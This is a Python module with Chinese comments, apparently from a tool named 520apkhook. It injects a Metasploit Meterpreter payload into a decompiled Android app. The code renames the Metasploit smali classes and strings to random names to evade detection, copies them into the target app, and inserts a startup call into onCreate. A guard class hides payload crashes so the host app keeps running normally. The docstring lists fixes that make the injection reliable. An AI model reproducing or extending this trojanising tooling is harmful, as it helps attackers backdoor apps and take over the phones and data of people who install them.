#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
InjectMsf2App —— 把 msf 的 smali 注入到目标 App 的启动组件里。

修掉的老实现问题：
1. 生成的指令带字面 `{p0}`：
   `"Lcom/{}/{}/{};->start(...)".format('{p0}', A, B, C)` -> `Lcom/{p0}/A/B;` ，
   类描述符直接写坏，smali 汇编失败/类找不到。
   现改为：`invoke-static {p0}, Lcom/A/B/C;->start(Landroid/content/Context;)V`。
2. 注入位置在 `.method ... onCreate(...)V` 之后、`.locals/.registers` 之前，
   属于非法指令区（.locals 必须是方法体第一条指令），smali 汇编必失败。
   现改为插在 `.locals`/`.registers` 行之后。
3. 用 `sort()[-1]` 选 smali 目录（classes2 目录名按字符串排序永远大于
   classes，实际常选错），且不校验目标类到底在哪。现改为"找到哪个目录就
   用哪个目录"。
4. 只有 "找不到 msf payload 就 interactive 输入" 一条路，没有任何边界处理。
   现在全部失败都返回明确原因，交给上层决定。
"""
import os
import random
import re
import shutil

# 注入到 onCreate 的那条指令的常量部分
START_METHOD = 'start(Landroid/content/Context;)V'
# 注入点不再直接调 Payload.start：先调一个 try/catch 包裹的 guard，
# 这样 payload 初始化抛异常（配置无效、JNI 加载失败、系统限制…）时
# 只会打一条日志，不会把宿主 App 直接带崩（"打开就闪退"的头号原因）。
GUARD_METHOD = 'run(Landroid/content/Context;)V'
INVOKE_TEMPLATE = '    invoke-static {{p0}}, {descriptor}->{method}'

# guard 类的 smali 模板（占位符：{a} {b} {guard} {payload}）
GUARD_TEMPLATE = '''.class public final Lcom/{a}/{b}/{guard};
.super Ljava/lang/Object;
.source "{guard}.java"


# 由 520apkhook 生成：payload 启动异常一律吞掉并记日志，绝不影响宿主 App。
.method public static run(Landroid/content/Context;)V
    .locals 3
    .param p0, "ctx"    # Landroid/content/Context;

    :try_start_0
    invoke-static {{p0}}, Lcom/{a}/{b}/{payload};->start(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {{:try_start_0 .. :try_end_0}} :catch_0

    return-void

    :catch_0
    move-exception v0

    const-string v1, "apkhook"

    const-string v2, "payload start failed (ignored)"

    invoke-static {{v1, v2, v0}}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    return-void
.end method
'''


# 匹配 `.method ... onCreate()V` / `.method ... onCreate(Landroid/os/Bundle;)V`
_ON_CREATE_RE = re.compile(
    r'(?m)^\.method[ \t]+(?P<flags>[^\n]*?)\b(?P<name>onCreate)\((?P<args>[^)]*)\)V[ \t]*\r?\n')
_LOCALS_RE = re.compile(r'(?m)^[ \t]*\.(locals|registers)[ \t]+\d+[ \t]*\r?\n')


class InjectError(RuntimeError):
    pass


class InjectMsf2App:
    def __init__(self, options=None):
        self.Options = options or {}

    # ------------------------------------------------------------- 基本工具
    @staticmethod
    def _abspath(*parts):
        return os.path.abspath(os.path.join(*parts))

    @staticmethod
    def _read(path):
        with open(path, 'r', encoding='utf-8', errors='surrogateescape') as fp:
            return fp.read()

    @staticmethod
    def _write(path, data):
        with open(path, 'w', encoding='utf-8', errors='surrogateescape', newline='') as fp:
            fp.write(data)

    @staticmethod
    def _replace_content(pattern, repl, path):
        text = InjectMsf2App._read(path)
        new_text = re.sub(pattern, repl, text)
        if new_text != text:
            InjectMsf2App._write(path, new_text)
        return new_text != text

    @staticmethod
    def _random_name(length=10):
        # 必须字母开头，避免生成非法标识符
        first = random.choice('abcdefghijklmnopqrstuvwxyz')
        rest = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(length - 1))
        return first + rest

    # --------------------------------------------------------- manifest 读取
    def ReadManifest(self, manifest_path):
        """
        用纯 Python 的 AxmlEdit 读二进制 AndroidManifest，返回
        {'package','application','launcher_activity','activities':[...]}
        AxmlEdit 不可用时返回 None（上层可用 xml2axml 解码文本兜底）。
        """
        try:
            from utils import AxmlEdit  # 延迟导入，便于单测
        except Exception:  # noqa: BLE001
            try:
                import AxmlEdit  # type: ignore
            except Exception:  # noqa: BLE001
                return None

        doc = AxmlEdit.load(manifest_path)
        app = AxmlEdit.application_element(doc)
        activities = []
        launcher = None
        if app is not None:
            for child in app.children:
                if child.tag != 'activity':
                    continue
                name = child.get_str('name') or ''
                activities.append(name)
                for sub in child.children:
                    if sub.tag != 'intent-filter':
                        continue
                    actions = [a.get_str('name') for a in sub.children if a.tag == 'action']
                    categories = [c.get_str('name') for c in sub.children if c.tag == 'category']
                    if ('android.intent.action.MAIN' in actions
                            and 'android.intent.category.LAUNCHER' in categories):
                        launcher = name
                        break
                if launcher:
                    break
        package = AxmlEdit.get_package_name(doc) or ''
        application = AxmlEdit.get_application_name(doc)
        return {
            'package': package,
            'application': application,
            'launcher_activity': launcher or (activities[0] if activities else None),
            'activities': activities,
        }

    @staticmethod
    def NormalizeClassName(package, name):
        """把 `.MainActivity` / `MainActivity` 补全成完整类名。"""
        if not name:
            return None
        name = name.strip()
        if name.startswith('.'):
            return f'{package}{name}'
        if '.' not in name:
            return f'{package}.{name}'
        return name

    # ------------------------------------------------------- 目标 smali 定位
    def ResolveTarget(self, smali_root, package, application, activity):
        """
        依次尝试 [自定义 Application 的 onCreate, 启动 Activity 的 onCreate]。

        :return: {'class','dex_dir','smali_path','kind'}
        找不到时抛 InjectError。
        """
        candidates = []
        app_cls = self.NormalizeClassName(package, application)
        if app_cls and app_cls != 'android.app.Application':
            candidates.append((app_cls, 'application'))
        act_cls = self.NormalizeClassName(package, activity)
        if act_cls:
            candidates.append((act_cls, 'activity'))

        if not candidates:
            raise InjectError('AndroidManifest 中既没有 Application 也没有 Activity，无法注入')

        dirs = [d for d in sorted(os.listdir(smali_root))
                if os.path.isdir(os.path.join(smali_root, d))]
        # classes, classes2, classes3... 的自然顺序
        dirs.sort(key=lambda d: (len(d), d))

        tried = []
        for cls, kind in candidates:
            rel = cls.replace('.', os.sep) + '.smali'
            for dex_dir in dirs:
                path = os.path.join(smali_root, dex_dir, rel)
                if os.path.isfile(path):
                    return {'class': cls, 'dex_dir': os.path.join(smali_root, dex_dir),
                            'smali_path': path, 'kind': kind}
                tried.append(os.path.join(dex_dir, rel))

        # 兜底：全量扫描（有些 App 的类名大小写/包名与实际 smali 目录不一致）
        for cls, kind in candidates:
            tail = os.path.basename(cls.replace('.', os.sep)) + '.smali'
            for dex_dir in dirs:
                base = os.path.join(smali_root, dex_dir)
                for root, _dirs, files in os.walk(base):
                    if tail in files:
                        found = os.path.join(root, tail)
                        rel = os.path.relpath(found, base).replace(os.sep, '.')[:-len('.smali')]
                        return {'class': rel, 'dex_dir': base, 'smali_path': found, 'kind': kind}

        raise InjectError(
            '在反编译的 smali 中找不到启动组件 %s（已尝试 %d 个路径）'
            % (', '.join(c for c, _ in candidates), len(tried)))

    # ------------------------------------------------------- msf smali 混淆
    def RandomizeMsfSmali(self, msf_smali_root, seed=None):
        """
        把 com/metasploit/stage/ 改名成 com/<a>/<b>/，Payload -> <c>.smali，
        并同步替换文件内容里的引用。

        :return: {'a','b','c','d','e','f','g','package_path','payload_smali'}
        """
        if seed:
            random.seed(seed)
        msf_smali_root = self._abspath(msf_smali_root)
        stage_dir = os.path.join(msf_smali_root, 'com', 'metasploit', 'stage')
        if not os.path.isdir(stage_dir):
            raise InjectError(f'msf smali 目录不符合预期（缺 com/metasploit/stage）: {msf_smali_root}')

        names = [self._random_name() for _ in range(7)]
        a, b, c, d, e, f, g = names
        # 保证 7 个随机名互不相同且都不等于 "metasploit"/"stage"/"Payload"
        while len(set(names)) != 7 or {a, b, c} & {'metasploit', 'stage', 'Payload'}:
            names = [self._random_name() for _ in range(7)]
            a, b, c, d, e, f, g = names

        com_dir = os.path.join(msf_smali_root, 'com')
        new_a = os.path.join(com_dir, a)
        new_b = os.path.join(new_a, b)

        # 已有同名残留（重复运行）先清掉
        if os.path.isdir(new_a):
            shutil.rmtree(new_a)
        # Windows 上 os.rename 不会自动创建目标父目录，必须先建
        os.makedirs(new_a, exist_ok=True)

        os.rename(stage_dir, new_b)
        # 清掉空的 com/metasploit
        old_meta = os.path.join(com_dir, 'metasploit')
        if os.path.isdir(old_meta) and not os.listdir(old_meta):
            os.rmdir(old_meta)

        payload = os.path.join(new_b, 'Payload.smali')
        if not os.path.isfile(payload):
            raise InjectError(f'msf smali 中缺少 Payload.smali: {new_b}')
        new_payload = os.path.join(new_b, f'{c}.smali')
        os.rename(payload, new_payload)

        for name in os.listdir(new_b):
            path = os.path.join(new_b, name)
            if not os.path.isfile(path):
                continue
            self._replace_content(r'com/metasploit/stage', f'com/{a}/{b}', path)
            self._replace_content(r'Lcom/metasploit/stage/', f'Lcom/{a}/{b}/', path)
            self._replace_content(r'\bPayload\b', c, path)

        # Payload 里的 meterpreter 类名与 "payload" 字符串再随机化
        self._replace_content(r'com\.metasploit\.meterpreter\.AndroidMeterpreter',
                              f'com.{d}.{e}.{f}', new_payload)
        self._replace_content(r'\bpayload\b', g, new_payload)

        # 生成 guard 类：payload 启动异常不再直接崩宿主 App
        guard = f'{c}Boot'
        guard_path = os.path.join(new_b, f'{guard}.smali')
        with open(guard_path, 'w', encoding='utf-8', newline='\n') as fp:
            fp.write(GUARD_TEMPLATE.format(a=a, b=b, guard=guard, payload=c))

        return {
            'a': a, 'b': b, 'c': c, 'd': d, 'e': e, 'f': f, 'g': g,
            'package_dir': new_b,
            'payload_smali': new_payload,
            'descriptor': f'Lcom/{a}/{b}/{c};',
            'guard_smali': guard_path,
            'guard_descriptor': f'Lcom/{a}/{b}/{guard};',
            'guard_method': GUARD_METHOD,
        }

    # ----------------------------------------------------------- 注入 onCreate
    def InjectStart(self, smali_path, descriptor=None, vars=None, method=None):
        """
        在 onCreate 的 `.locals/.registers` 之后插入启动指令。

        默认（给了 vars）走 guard：`invoke-static {p0}, Lx/y/Boot;->run(Context)V`，
        payload 若启动失败只会打 `apkhook` 日志，不会让宿主 App 闪退。
        只给 descriptor 时保持老行为，直接调 `->start(Context)V`。

        :param descriptor: 完整类描述符 Lx/y/Z;
        :param vars: RandomizeMsfSmali 的返回值（不给 descriptor 时用它拼）
        :param method: 显式指定被调方法名（默认按 vars 推断）
        :return: {'changed':bool,'method':str,'instruction':str,'before':str,'after':str}
        """
        if descriptor is None:
            if not vars:
                raise InjectError('InjectStart 需要 descriptor 或 vars')
            descriptor = vars.get('guard_descriptor') or vars['descriptor']
        if method is None:
            if vars and vars.get('guard_descriptor') and descriptor == vars['guard_descriptor']:
                method = vars.get('guard_method') or GUARD_METHOD
            else:
                method = START_METHOD

        text = self._read(smali_path)
        instruction = INVOKE_TEMPLATE.format(descriptor=descriptor, method=method)
        # 幂等：已注入过就直接返回
        if descriptor in text and 'invoke-static {p0}, ' + descriptor in text:
            return {'changed': False, 'reason': 'already injected', 'instruction': instruction}

        matches = list(_ON_CREATE_RE.finditer(text))
        if not matches:
            raise InjectError(
                f'`{smali_path}` 中找不到 onCreate()V / onCreate(Landroid/os/Bundle;)V')

        chosen = None
        for match in matches:
            flags = match.group('flags') or ''
            if re.search(r'\bstatic\b', flags):
                continue
            # 之后必须紧跟 .locals/.registers
            rest = text[match.end():]
            locals_match = _LOCALS_RE.match(rest)
            if not locals_match:
                # 允许中间有空行
                stripped = rest.lstrip('\r\n')
                offset = len(rest) - len(stripped)
                locals_match = _LOCALS_RE.match(stripped)
                if locals_match:
                    chosen = (match, match.end() + offset + locals_match.end())
                    break
                continue
            chosen = (match, match.end() + locals_match.end())
            break

        if not chosen:
            raise InjectError(
                f'`{smali_path}` 的 onCreate 方法体缺少 .locals/.registers（可能是 abstract/native）')

        match, insert_at = chosen
        new_text = text[:insert_at] + instruction + '\n' + text[insert_at:]
        self._write(smali_path, new_text)

        method_header = text[match.start():match.end()].strip()
        lines = new_text[:insert_at].splitlines()
        return {
            'changed': True,
            'method': method_header,
            'instruction': instruction,
            'before': '\n'.join(lines[-4:]),
            'after': '\n'.join(new_text[:insert_at + len(instruction) + 1].splitlines()[-4:]),
        }

    # --------------------------------------------------------- 拷贝 payload
    def InstallPayload(self, msf_smali_root, target_dex_dir, vars):
        """
        把混淆后的 com/<a>/ 拷进目标 dex 的 smali 目录。返回目标目录路径。
        """
        src = os.path.join(self._abspath(msf_smali_root), 'com', vars['a'])
        dst = os.path.join(self._abspath(target_dex_dir), 'com', vars['a'])
        if not os.path.isdir(src):
            raise InjectError(f'msf 混淆目录不存在: {src}')
        if os.path.isdir(dst):
            shutil.rmtree(dst)
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        shutil.copytree(src, dst)
        return dst

    def RollbackPayload(self, target_dex_dir, vars):
        """删除先前注入的 payload smali（重跑/失败回收用）。"""
        dst = os.path.join(self._abspath(target_dex_dir), 'com', vars.get('a', ''))
        if vars.get('a') and os.path.isdir(dst):
            shutil.rmtree(dst)
            return True
        return False

    def AddSleep(self):
        pass

    # ==================================================== 旧接口兼容（保留）
    def GetInjectAppLauncherActivit(self, **kwargs):
        info = self.ReadManifest(kwargs['androidmanifestfile'])
        if info is None:
            return False
        return (self.NormalizeClassName(info['package'], info['application'])
                or self.NormalizeClassName(info['package'], info['launcher_activity'])
                or False)

    def GetInjectAppLauncherActivitFile(self, **kwargs):
        info = self.ReadManifest(kwargs['androidmanifestfile'])
        if info is None:
            raise InjectError('无法解析 AndroidManifest.xml')
        target = self.ResolveTarget(kwargs['appdexpath'], info['package'],
                                    info['application'], info['launcher_activity'])
        return target['class'], target['dex_dir'], target['smali_path']

    def RandomMsfSmali(self, **kwargs):
        vars_ = self.RandomizeMsfSmali(kwargs['msfsmalipath'])
        return [vars_['a'], vars_['b'], vars_['c']]

    def InjectMsf2SmaliFile(self, **kwargs):
        descriptor = 'Lcom/{}/{}/{};'.format(*kwargs['vars'])
        result = self.InjectStart(kwargs['injectapplauncheractivitsmalipath'], descriptor=descriptor)
        return result.get('after', False) if result['changed'] else False

    def CopyMsfSmali2AppSmali(self, **kwargs):
        payload = os.path.join(kwargs['msfsmalipath'], 'com', kwargs['vars'][0])
        dst = os.path.join(kwargs['moveapplauncheractivityclasspath'], 'com', kwargs['vars'][0])
        if os.path.isdir(dst):
            shutil.rmtree(dst)
        shutil.copytree(payload, dst)


if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print('usage: InjectMsf2App.py <binary-AndroidManifest.xml>')
        raise SystemExit(0)
    inject = InjectMsf2App()
    print(inject.ReadManifest(sys.argv[1]))
